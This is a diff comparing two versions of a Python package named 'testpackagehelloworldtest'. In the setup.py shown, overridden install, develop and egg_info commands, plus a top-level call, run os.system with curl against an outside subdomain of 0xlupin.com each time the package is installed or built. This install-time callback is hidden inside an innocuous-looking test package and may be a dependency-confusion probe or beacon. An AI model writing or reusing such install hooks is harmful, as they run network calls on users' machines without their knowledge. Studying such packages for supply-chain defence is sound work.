# Comparing `tmp/testpackagehelloworldtest-0.0.4.tar.gz` & `tmp/testpackagehelloworldtest-0.0.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "testpackagehelloworldtest-0.0.4.tar", last modified: Mon Apr 17 13:14:05 2023, max compression
+gzip compressed data, was "testpackagehelloworldtest-0.0.5.tar", last modified: Mon Apr 17 13:16:17 2023, max compression
```

## Comparing `testpackagehelloworldtest-0.0.4.tar` & `testpackagehelloworldtest-0.0.5.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxr-xr-x   0 roni.carta   (502) staff       (20)        0 2023-04-17 13:14:05.509048 testpackagehelloworldtest-0.0.4/
--rw-r--r--   0 roni.carta   (502) staff       (20)       69 2023-04-17 13:14:05.509114 testpackagehelloworldtest-0.0.4/PKG-INFO
--rw-r--r--   0 roni.carta   (502) staff       (20)       23 2023-04-17 12:51:01.000000 testpackagehelloworldtest-0.0.4/README.md
--rw-r--r--   0 roni.carta   (502) staff       (20)       79 2023-04-17 13:14:05.509395 testpackagehelloworldtest-0.0.4/setup.cfg
--rw-r--r--   0 roni.carta   (502) staff       (20)      934 2023-04-17 13:13:26.000000 testpackagehelloworldtest-0.0.4/setup.py
-drwxr-xr-x   0 roni.carta   (502) staff       (20)        0 2023-04-17 13:14:05.508895 testpackagehelloworldtest-0.0.4/testpackagehelloworldtest.egg-info/
--rw-r--r--   0 roni.carta   (502) staff       (20)       69 2023-04-17 13:14:00.000000 testpackagehelloworldtest-0.0.4/testpackagehelloworldtest.egg-info/PKG-INFO
--rw-r--r--   0 roni.carta   (502) staff       (20)      224 2023-04-17 13:14:00.000000 testpackagehelloworldtest-0.0.4/testpackagehelloworldtest.egg-info/SOURCES.txt
--rw-r--r--   0 roni.carta   (502) staff       (20)        1 2023-04-17 13:14:00.000000 testpackagehelloworldtest-0.0.4/testpackagehelloworldtest.egg-info/dependency_links.txt
--rw-r--r--   0 roni.carta   (502) staff       (20)        1 2023-04-17 13:14:00.000000 testpackagehelloworldtest-0.0.4/testpackagehelloworldtest.egg-info/top_level.txt
+drwxr-xr-x   0 roni.carta   (502) staff       (20)        0 2023-04-17 13:16:17.919569 testpackagehelloworldtest-0.0.5/
+-rw-r--r--   0 roni.carta   (502) staff       (20)       69 2023-04-17 13:16:17.919652 testpackagehelloworldtest-0.0.5/PKG-INFO
+-rw-r--r--   0 roni.carta   (502) staff       (20)       23 2023-04-17 12:51:01.000000 testpackagehelloworldtest-0.0.5/README.md
+-rw-r--r--   0 roni.carta   (502) staff       (20)       79 2023-04-17 13:16:17.920005 testpackagehelloworldtest-0.0.5/setup.cfg
+-rw-r--r--   0 roni.carta   (502) staff       (20)      915 2023-04-17 13:16:13.000000 testpackagehelloworldtest-0.0.5/setup.py
+drwxr-xr-x   0 roni.carta   (502) staff       (20)        0 2023-04-17 13:16:17.919443 testpackagehelloworldtest-0.0.5/testpackagehelloworldtest.egg-info/
+-rw-r--r--   0 roni.carta   (502) staff       (20)       69 2023-04-17 13:16:17.000000 testpackagehelloworldtest-0.0.5/testpackagehelloworldtest.egg-info/PKG-INFO
+-rw-r--r--   0 roni.carta   (502) staff       (20)      224 2023-04-17 13:16:17.000000 testpackagehelloworldtest-0.0.5/testpackagehelloworldtest.egg-info/SOURCES.txt
+-rw-r--r--   0 roni.carta   (502) staff       (20)        1 2023-04-17 13:16:17.000000 testpackagehelloworldtest-0.0.5/testpackagehelloworldtest.egg-info/dependency_links.txt
+-rw-r--r--   0 roni.carta   (502) staff       (20)        1 2023-04-17 13:16:17.000000 testpackagehelloworldtest-0.0.5/testpackagehelloworldtest.egg-info/top_level.txt
```

### Comparing `testpackagehelloworldtest-0.0.4/setup.py` & `testpackagehelloworldtest-0.0.5/setup.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,16 +1,15 @@
 from setuptools import setup, find_packages
 from setuptools.command.install import install
 from setuptools.command.develop import develop
 from setuptools.command.egg_info import egg_info
 import os
 
 def custom_command():
-    import requests
-    os.system("curl http://testpackagehelloworldtest.package.0xlupin.com/")
+    os.system("curl http://testpackagehelloworldtest5.package.0xlupin.com/")
 
 
 class CustomInstallCommand(install):
     def run(self):
         install.run(self)
         custom_command()
 
@@ -27,15 +26,15 @@
         custom_command()
 
 
 custom_command()
 
 setup(
     name="testpackagehelloworldtest",
-    version="0.0.4",
+    version="0.0.5",
     packages=find_packages(),
     install_requires=[],
     cmdclass={
         'install': CustomInstallCommand,
         'develop': CustomDevelopCommand,
         'egg_info': CustomEggInfoCommand,
     },
```

